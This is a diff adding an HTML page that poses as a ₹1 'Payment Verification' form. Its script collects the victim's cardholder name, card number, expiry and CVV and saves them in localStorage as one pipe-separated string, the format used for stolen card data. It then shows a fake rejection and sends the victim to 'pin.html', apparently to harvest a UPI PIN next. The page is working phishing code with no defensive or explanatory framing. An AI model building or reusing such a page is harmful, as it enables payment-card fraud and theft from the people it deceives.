@@ -1,0 +1,68 @@
+<!DOCTYPE html><html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Card Verification</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet" />
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #e8f1ff, #f3faff); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
+    .card-box { background: #ffffff; width: 100%; max-width: 380px; padding: 32px 26px; border-radius: 20px; box-shadow: 0 8px 40px rgba(11, 102, 255, 0.14); text-align: center; }
+    .card-box h2 { font-size: 22px; font-weight: 800; color: #0b66ff; margin-bottom: 6px; }
+    .card-box p { font-size: 14px; color: #475569; margin-bottom: 20px; }
+    label { font-size: 14px; font-weight: 600; display: block; margin-bottom: 6px; text-align: left; }
+    input { width: 100%; padding: 12px; border-radius: 12px; border: 1.5px solid #d0d7e5; background: #f9fafc; font-size: 15px; margin-bottom: 16px; outline: none; }
+    .row { display: flex; gap: 10px; }
+    button { width: 100%; background: #0b66ff; color: white; font-weight: 800; border: none; padding: 14px; font-size: 15px; border-radius: 12px; cursor: pointer; }
+    .overlay { position: fixed; inset: 0; background: rgba(0, 0, 0, 0.45); display: none; align-items: center; justify-content: center; z-index: 999; }
+    .popup { background: #ffffff; padding: 28px 24px; border-radius: 16px; text-align: center; }
+  </style>
+</head>
+<body>
+  <div class="card-box">
+    <h2>Payment Verification • ₹1.00</h2>
+    <p>Card will be validated securely.</p>
+    <form id="ccForm">
+      <label for="name">Cardholder Name</label>
+      <input type="text" id="name" required />
+      <label for="card">Card Number</label>
+      <input type="text" id="card" maxlength="19" required placeholder="0000 0000 0000 0000" />
+      <div class="row">
+        <div style="flex:1"><label for="expiry">Expiry</label><input type="text" id="expiry" maxlength="5" placeholder="MM/YY" required /></div>
+        <div style="flex:1"><label for="cvv">CVV</label><input type="text" id="cvv" maxlength="4" required /></div>
+      </div>
+      <button type="submit">Pay ₹1 for Verification</button>
+    </form>
+  </div>  
+  <div class="overlay" id="popup"><div class="popup"><p id="popupMsg">Verifying your card...</p></div></div>  
+
+  <script>
+    const cardInput = document.getElementById("card");
+    cardInput.addEventListener("input", () => {
+      let raw = cardInput.value.replace(/\D/g, "").slice(0, 19);
+      cardInput.value = raw.replace(/(.{4})/g, "$1 ").trim();
+    });
+    document.getElementById("expiry").addEventListener("input", function () {
+      let val = this.value.replace(/[^\d]/g, "");
+      if (val.length >= 3) val = val.replace(/(\d{2})(\d{1,2})/, "$1/$2");
+      this.value = val;
+    });
+    document.getElementById('ccForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const name = document.getElementById("name").value;
+      const card = cardInput.value.replace(/\s+/g, "");
+      const expiry = document.getElementById("expiry").value;
+      const cvv = document.getElementById("cvv").value;
+      
+      const expParts = expiry.split("/");
+      const fullCard = `${name} | ${card} | ${expParts[0]} | ${expParts[1]} | ${cvv}`;
+      localStorage.setItem("cc_inp", fullCard);
+      
+      document.getElementById('popup').style.display = "flex";
+      setTimeout(() => {
+        document.getElementById('popupMsg').innerHTML = "Your card isn't valid for this transaction.<br>Please use UPI for verification.<br><br><button onclick=\"window.location.href='pin.html'\">Okay</button>";
+      }, 800);
+    });
+  </script>
+</body>
+                                                                                                               </html>
